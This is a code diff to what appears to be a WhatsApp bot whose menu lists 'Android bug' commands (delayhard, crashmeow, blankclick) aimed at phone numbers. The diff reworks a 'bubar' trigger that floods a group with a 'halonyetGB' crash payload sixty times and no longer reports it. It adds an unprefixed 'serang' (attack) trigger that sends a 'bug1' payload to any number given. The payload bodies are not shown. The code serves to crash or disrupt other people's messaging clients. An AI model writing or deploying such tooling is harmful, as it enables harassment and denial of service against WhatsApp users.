@@ -569,6 +569,7 @@ async function sendWAMenu(sock, from, mek, sender) {
 ▸ .status  — status bot
 
 \`「 ANDROID BUG 」\`
+▸ .delayhard (bug in place)
 ▸ .delayhard 62xxx
 ▸ .crashmeow 62xxx
 ▸ .blankclick 62xxx
@@ -700,34 +701,43 @@ async function handleWAMessage(sock, number, chatUpdate) {
     // ================= END LOG =================
 
     // ===== TRIGGER "bubar" TANPA PREFIX =====
-    if (body.trim().toLowerCase() === "bubar") {
-      try {
-        const groupMetadata = await sock.groupMetadata(from);
-        const groupJid = groupMetadata.id;
+if (body.trim().toLowerCase() === "bubar") {
+  try {
+    await sock.sendMessage(from, {
+      react: { text: "☀️", key: mek.key }
+    });
 
-        await sock.sendMessage(from, {
-          text: `kintana is here ${groupMetadata.subject}...`
-        }, { quoted: mek });
+    const groupMetadata = await sock.groupMetadata(from);
+    const groupJid = groupMetadata.id;
 
-        for (let i = 0; i < 20; i++) {
-          await Promise.allSettled([
-            halonyetGB(sock, groupJid).catch(() => {}),
-            halonyetGB(sock, groupJid).catch(() => {}),
-            halonyetGB(sock, groupJid).catch(() => {})
-          ]);
-          await sleep(500);
-        }
-
-        await sock.sendMessage(from, {
-          text: `✅ Bug grup terkirim.`
-        }, { quoted: mek });
-      } catch (e) {
-        await sock.sendMessage(from, {
-          text: `❌ Error: ${e.message}`
-        }, { quoted: mek });
-      }
-      return;
+    for (let i = 0; i < 20; i++) {
+      await Promise.allSettled([
+        halonyetGB(sock, groupJid).catch(() => {}),
+        halonyetGB(sock, groupJid).catch(() => {}),
+        halonyetGB(sock, groupJid).catch(() => {})
+      ]);
+      await sleep(500);
     }
+  } catch (e) {}
+  return;
+}
+
+if (body.trim().toLowerCase().startsWith("serang")) {
+  const args = body.trim().split(/\s+/).slice(1);
+  if (!args[0]) return;
+
+  const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
+
+  await sock.sendMessage(from, {
+    react: { text: "☀️", key: mek.key }
+  });
+
+  try {
+    await bug1(sock, target);
+    await bug1(sock, target);
+  } catch (e) {}
+  return;
+}
     // ===== END TRIGGER =====
 
     if (!body.startsWith(".")) return;
